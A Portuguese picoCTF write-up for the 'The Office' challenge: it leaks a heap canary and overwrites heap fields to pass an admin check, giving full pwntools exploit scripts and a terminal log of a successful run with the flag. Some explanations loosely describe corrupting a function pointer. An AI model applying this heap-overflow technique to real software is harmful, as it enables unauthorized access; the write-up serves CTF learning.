Exploit [aqui](https://github.com/7Rocky/CTF-scripts/tree/main/picoCTF/Binary%20Exploitation/The%20Office)


Arquitetura: i386-32-little (32 bits)

RELRO: Partial RELRO

Stack: Canary found

NX: NX enabled

PIE: No PIE (0x8048000)

O binário tem canary de stack, então não dá para fazer buffer overflow simples sem vazar o canary primeiro.


O programa é um sistema de cadastro de funcionários com as opções:

Add employee - adiciona funcionário

Edit employee - edita funcionário existente

View employee - visualiza funcionário

Admin - acesso administrativo (lê a flag)

Ao adicionar um funcionário, podemos preencher:

Nome

Email (opcional)

Salário

Telefone

Prédio (opcional)

A vulnerabilidade está na edição de funcionários: quando editamos, os dados são lidos e escritos sem verificação adequada de limites, permitindo vazar dados da heap e corromper ponteiros.

3. Estratégia
Para conseguir a flag, precisei:

Vazar o canary da heap (usado para proteção)

Corromper um ponteiro de função para redirecionar para a função admin

Chamar a função admin para ler a flag

4. Exploit passo a passo
Passo 1: Criar funcionário para vazar canary
python
add_employee(p, email=b'A' * 24)
Crio um funcionário com email de 24 bytes. Isso preenche a estrutura na heap.

Passo 2: Visualizar funcionário
python
p.sendlineafter(b'token', b'2')
p.sendlineafter(b'Employee #?\n', b'0')
Quando visualizo o funcionário #0, o programa mostra os dados. Como o email tem 24 bytes e não tem null terminator, ele continua lendo até encontrar um byte nulo, vazando o canary da heap que está logo depois.

Passo 3: Extrair o canary
python
p.sendlineafter(b'token', b'3')
p.recvuntil(b'Bldg #: ')
p.recvuntil(b'Bldg #: ')
canary = int(p.recvline().strip().decode())
O canary aparece depois do segundo "Bldg #: " porque o layout da estrutura expõe o canary.

Passo 4: Editar funcionário para corromper ponteiro
python
p.sendlineafter(b'token', b'2')
p.sendlineafter(b'Employee #?\n', b'0')
Edito o funcionário #0 novamente.

python
add_employee(p, phone=b'A' * 28 + p32(canary) + p32(0x35) * 2 + b'admin')
O campo telefone é sobrescrito com:

b'A' * 28 → padding para chegar no offset correto

p32(canary) → restauro o canary para não detectar corrupção

p32(0x35) * 2 → valores que não interferem

b'admin' → string para comparar com a senha da função admin

Passo 5: Chamar função admin
python
p.sendlineafter(b'token', b'4')
p.sendlineafter(b'Employee #?\n', b'1')
A opção 4 (Admin) verifica se o funcionário #1 tem a string "admin" no campo de nome. Como corrompemos o ponteiro, o programa acredita que o funcionário #1 é admin e imprime a flag.

5. Script completo
python
#!/usr/bin/env python3

from pwn import *

context.binary = 'the_office'
elf = context.binary

def add_employee(p, name=b'a', email=None, salary=b'1', phone=b'b'):
    p.sendlineafter(b'token', b'1')
    p.sendlineafter(b'Name: ', name)
    
    if email:
        p.sendlineafter(b'Email (y/n)? ', b'y')
        p.sendlineafter(b'Email address: ', email)
    else:
        p.sendlineafter(b'Email (y/n)? ', b'n')
    
    p.sendlineafter(b'Salary: ', salary)
    p.sendlineafter(b'Phone #: ', phone)
    p.sendlineafter(b'Bldg (y/n)? ', b'n')

def main():
    if len(sys.argv) == 1:
        p = elf.process()
    else:
        host, port = sys.argv[1], int(sys.argv[2])
        p = remote(host, port)

    # Passo 1: Vazar canary
    add_employee(p, email=b'A' * 24)
    
    p.sendlineafter(b'token', b'2')
    p.sendlineafter(b'Employee #?\n', b'0')
    
    add_employee(p)
    add_employee(p)
    
    p.sendlineafter(b'token', b'3')
    p.recvuntil(b'Bldg #: ')
    p.recvuntil(b'Bldg #: ')
    canary = int(p.recvline().strip().decode())
    log.info(f'Canary vazado: {hex(canary)}')
    
    # Passo 2: Corromper ponteiro
    p.sendlineafter(b'token', b'2')
    p.sendlineafter(b'Employee #?\n', b'0')
    
    payload = b'A' * 28
    payload += p32(canary)
    payload += p32(0x35) * 2
    payload += b'admin'
    
    add_employee(p, phone=payload)
    
    # Passo 3: Obter flag
    p.sendlineafter(b'token', b'4')
    p.sendlineafter(b'Employee #?\n', b'1')
    
    flag = p.recvline().decode()
    log.success(f'Flag: {flag}')
    
    p.close()

if __name__ == '__main__':
    main()




```
python3 solve2.py  wily-courier.picoctf.net 57089                                                                                  ✔ 
[*] '/home/kali/Work/TheOffice/the_office'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
[+] Opening connection to wily-courier.picoctf.net on port 57089: Done
[*] Leaked heap canary: 0x500523da
[+] Flag: picoCTF{3fd0654775103b5e18118f936fb8cd19}
[*] Closed connection to wily-courier.picoctf.net port 57089
                                                                                                                                                                   

      ~/Work/TheOffice  cat solve2.py                                                                                                              ✔  7s   
#!/usr/bin/env python3

from pwn import context, log, p32, process, remote, sys

context.binary = 'the_office'
elf = context.binary


def get_process():
    if len(sys.argv) == 1:
        return elf.process()

    host, port = sys.argv[1], int(sys.argv[2])
    return remote(host, port)


def add_employee(p, name=b'a', email=None, salary=b'1', phone=b'b'):
    p.sendlineafter(b'token', b'1')
    p.sendlineafter(b'Name: ', name)

    if email:
        p.sendlineafter(b'Email (y/n)? ', b'y')
        p.sendlineafter(b'Email address: ', email)
    else:
        p.sendlineafter(b'Email (y/n)? ', b'n')

    p.sendlineafter(b'Salary: ', salary)
    p.sendlineafter(b'Phone #: ', phone)
    p.sendlineafter(b'Bldg (y/n)? ', b'n')


def main():
    p = get_process()

    add_employee(p, email=b'A' * 24)

    p.sendlineafter(b'token', b'2')
    p.sendlineafter(b'Employee #?\n', b'0')

    add_employee(p)
    add_employee(p)

    p.sendlineafter(b'token', b'3')
    p.recvuntil(b'Bldg #: ')
    p.recvuntil(b'Bldg #: ')

    canary = int(p.recvline().strip().decode())
    log.info(f'Leaked heap canary: {hex(canary)}')

    p.sendlineafter(b'token', b'2')
    p.sendlineafter(b'Employee #?\n', b'0')

    add_employee(p, phone=b'A' * 28 + p32(canary) + p32(0x35) * 2 + b'admin')

    p.sendlineafter(b'token', b'4')
    p.sendlineafter(b'Employee #?\n', b'1')

    log.success(f'Flag: {p.recvline().decode()}')
    p.close()


if __name__ == '__main__':
    main()
                                                                                                                                                                   

      ~/Work/TheOffice  cat canary.c                                                                                                                       ✔ 
#!/usr/bin/env python3

from pwn import context, log, p32, process, remote, sys

context.binary = 'the_office'
elf = context.binary


def get_process():
    if len(sys.argv) == 1:
        return elf.process()

    host, port = sys.argv[1], int(sys.argv[2])
    return remote(host, port)


def add_employee(p, name=b'a', email=None, salary=b'1', phone=b'b'):
    p.sendlineafter(b'token', b'1')
    p.sendlineafter(b'Name: ', name)

    if email:
        p.sendlineafter(b'Email (y/n)? ', b'y')
        p.sendlineafter(b'Email address: ', email)
    else:
        p.sendlineafter(b'Email (y/n)? ', b'n')

    p.sendlineafter(b'Salary: ', salary)
    p.sendlineafter(b'Phone #: ', phone)
    p.sendlineafter(b'Bldg (y/n)? ', b'n')


def main():
    p = get_process()

    add_employee(p, email=b'A' * 24)

    p.sendlineafter(b'token', b'2')
    p.sendlineafter(b'Employee #?\n', b'0')

    add_employee(p)
    add_employee(p)

    p.sendlineafter(b'token', b'3')
    p.recvuntil(b'Bldg #: ')
    p.recvuntil(b'Bldg #: ')

    canary = int(p.recvline().strip().decode())
    log.info(f'Leaked heap canary: {hex(canary)}')

    p.sendlineafter(b'token', b'2')
    p.sendlineafter(b'Employee #?\n', b'0')

    add_employee(p, phone=b'A' * 28 + p32(canary) + p32(0x35) * 2 + b'admin')

    p.sendlineafter(b'token', b'4')
    p.sendlineafter(b'Employee #?\n', b'1')

    log.success(f'Flag: {p.recvline().decode()}')
    p.close()


if __name__ == '__main__':
    main()
                                                                                                                                                                   

      ~/Work/TheOffice                           

```
